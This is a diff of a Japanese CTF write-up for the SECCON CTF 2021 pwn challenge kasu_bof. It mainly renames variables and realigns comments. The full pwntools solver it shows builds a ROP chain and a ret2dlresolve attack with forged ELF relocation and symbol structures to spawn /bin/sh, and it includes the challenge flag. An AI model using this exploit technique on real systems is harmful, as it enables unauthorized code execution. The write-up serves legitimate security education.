@@ -3,7 +3,7 @@ title: "SECCON CTF 2021 - kasu_bof Writeup"
 date: 2023-02-28T10:51:55+09:00
 draft: false
 summary: "本記事はSECCON CTF 2021のPwn問題kasu_bofのWriteupです。"
-author: "mc4nf"
+author: "siva"
 ---
 
 ** 問題
@@ -588,37 +588,37 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
      #+begin_src python
       # padding
       buf = b'A'*0x84                 # fill stack
-      buf += p32(0xdeadbeaf)         # saved_ebp
+      buf += p32(0xdeadbeaf)          # saved_ebp
 
       # gets(fake_elf32_rel_addr)
-      buf += p32(gets_plt)           # main return addr
-      buf += p32(pop_ret)            # gets return addr
-      buf += p32(fake_elf32_rel_addr)     # gets arg
+      buf += p32(gets_plt)            # main return addr
+      buf += p32(pop_ret)             # gets return addr
+      buf += p32(fake_elf32_rel_addr) # gets arg
 
       # gets(fake_elf32_sym_addr)
-      buf += p32(gets_plt)           # pop ret return addr
-      buf += p32(pop_ret)            # gets return addr
-      buf += p32(fake_elf32_sym_addr)     # gets arg
+      buf += p32(gets_plt)            # pop ret return addr
+      buf += p32(pop_ret)             # gets return addr
+      buf += p32(fake_elf32_sym_addr) # gets arg
 
       # gets(system_symbol_addr)
-      buf += p32(gets_plt)           # pop ret return addr
-      buf += p32(pop_ret)            # gets return addr
-      buf += p32(system_symbol_addr) # gets arg
+      buf += p32(gets_plt)            # pop ret return addr
+      buf += p32(pop_ret)             # gets return addr
+      buf += p32(system_symbol_addr)  # gets arg
 
       # gets(sh_string_addr)
-      buf += p32(gets_plt)           # pop ret return addr
-      buf += p32(pop_ret)            # gets return  addr
-      buf += p32(sh_string_addr)     # gets arg
+      buf += p32(gets_plt)            # pop ret return addr
+      buf += p32(pop_ret)             # gets return addr
+      buf += p32(sh_string_addr)      # gets arg
      #+end_src
 
      それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 ~.plt~ セクションの先頭にジャンプする。
      このとき、 ~system~ の引数として ~"/bin/sh"~ を取れるように、 ~"/bin/sh"~ が格納されたアドレスをスタックに積んでおく。
      #+begin_src python
       # system('/bin/sh')
-      buf += p32(plt)                # pop ret return addr
-      buf += p32(reloc_arg)          # reloc arg
-      buf += p32(0xdeadbeef)         # return address of system()
-      buf += p32(sh_string_addr)     # system arg
+      buf += p32(plt)                 # pop ret return addr
+      buf += p32(reloc_arg)           # reloc arg
+      buf += p32(0xdeadbeef)          # system return addr
+      buf += p32(sh_string_addr)      # system arg
      #+end_src
 
 *** Solver    
@@ -630,8 +630,8 @@ filename = './chall'
 chall = ELF(filename)
 
 # docker-compose up
-conn = remote('localhost', 9001)
-# conn = process(filename)
+# conn = remote('localhost', 9001)
+conn = process(filename)
 
 plt = chall.get_section_by_name('.plt').header.sh_addr
 bss = chall.get_section_by_name('.bss').header.sh_addr
@@ -644,57 +644,57 @@ gets_plt = chall.plt['gets']
 # 0x08049022: pop ebx; ret;
 pop_ret = 0x08049022
 
-Elf32_Rel_addr = bss
+fake_elf32_rel_addr = bss
 
-Elf32_Sym_addr = Elf32_Rel_addr + 0x10
+fake_elf32_sym_addr = fake_elf32_rel_addr + 0x10
 
-system_symbol_addr = Elf32_Sym_addr + 0x14
+system_symbol_addr = fake_elf32_sym_addr + 0x14
 
 sh_symbol_addr = system_symbol_addr + 0x1c
 
 # calc index of Elf32_Rel from .rel.plt
-reloc_arg = Elf32_Rel_addr - rel
+reloc_arg = fake_elf32_rel_addr - rel
 
 # padding
-buf = b'A'*0x84                 # fill stack
-buf += p32(0xdeadbeaf)         # saved_ebp
+buf = b'A'*0x84                  # fill stack
+buf += p32(0xdeadbeaf)           # saved_ebp
 
-# gets(Elf32_Rel_addr)
-buf += p32(gets_plt)           # main return addr
-buf += p32(pop_ret)            # gets return addr
-buf += p32(Elf32_Rel_addr)     # gets arg
+# gets(fake_elf32_rel_addr)
+buf += p32(gets_plt)             # main return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(fake_elf32_rel_addr)  # gets arg
 
-# gets(Elf32_Sym_addr)
-buf += p32(gets_plt)           # pop ret return addr
-buf += p32(pop_ret)            # gets return addr
-buf += p32(Elf32_Sym_addr)     # gets arg
+# gets(fake_elf32_sym_addr)
+buf += p32(gets_plt)             # pop ret return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(fake_elf32_sym_addr)  # gets arg
 
 # gets(system_symbol_addr)
-buf += p32(gets_plt)           # pop ret return addr
-buf += p32(pop_ret)            # gets return addr
-buf += p32(system_symbol_addr) # gets arg
+buf += p32(gets_plt)             # pop ret return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(system_symbol_addr)   # gets arg
 
 # gets(sh_symbol_addr)
-buf += p32(gets_plt)           # pop ret return addr
-buf += p32(pop_ret)            # gets return  addr
-buf += p32(sh_symbol_addr)     # gets arg
+buf += p32(gets_plt)             # pop ret return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(sh_symbol_addr)       # gets arg
 
 # system('/bin/sh')
-buf += p32(plt)                # pop ret return addr
-buf += p32(reloc_arg)          # reloc arg
-buf += p32(0xdeadbeef)         # padding
-buf += p32(sh_symbol_addr)     # system arg
+buf += p32(plt)                  # pop ret return addr
+buf += p32(reloc_arg)            # reloc arg
+buf += p32(0xdeadbeef)           # system retrun addr
+buf += p32(sh_symbol_addr)       # system arg
 
 conn.sendline(buf)
 
 # create Elf32_Rel
 r_offset = gets_got
-r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
+r_info   = ((fake_elf32_sym_addr - dynsym)//0x10)<<8 | 7
 
-Elf32_Rel = p32(r_offset)
-Elf32_Rel += p32(r_info)
+fake_elf32_rel = p32(r_offset)
+fake_elf32_rel += p32(r_info)
     
-conn.sendline(Elf32_Rel)
+conn.sendline(fake_elf32_rel)
 
 # create Elf32_Sym
 st_name = system_symbol_addr - dynstr
@@ -704,14 +704,14 @@ st_info = 0x12
 st_other = 0x0
 st_shndx = 0x0
 
-Elf32_Sym = p32(st_name)
-Elf32_Sym += p32(st_value)
-Elf32_Sym += p32(st_size)
-Elf32_Sym += p8(st_info)
-Elf32_Sym += p8(st_other)
-Elf32_Sym += p16(st_shndx)
+fake_elf32_sym = p32(st_name)
+fake_elf32_sym += p32(st_value)
+fake_elf32_sym += p32(st_size)
+fake_elf32_sym += p8(st_info)
+fake_elf32_sym += p8(st_other)
+fake_elf32_sym += p16(st_shndx)
 
-conn.sendline(Elf32_Sym)
+conn.sendline(fake_elf32_sym)
 
 # create system symbol
 conn.sendline(b'system')
@@ -720,8 +720,6 @@ conn.sendline(b'system')
 conn.sendline(b'/bin/sh')
 
 conn.interactive()
-
-
     #+end_src
 
 **** 実行結果
@@ -777,4 +775,4 @@ SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
 
 
 created 2022/11/11\\
-updated 2022/12/21
+updated 2023/2/28
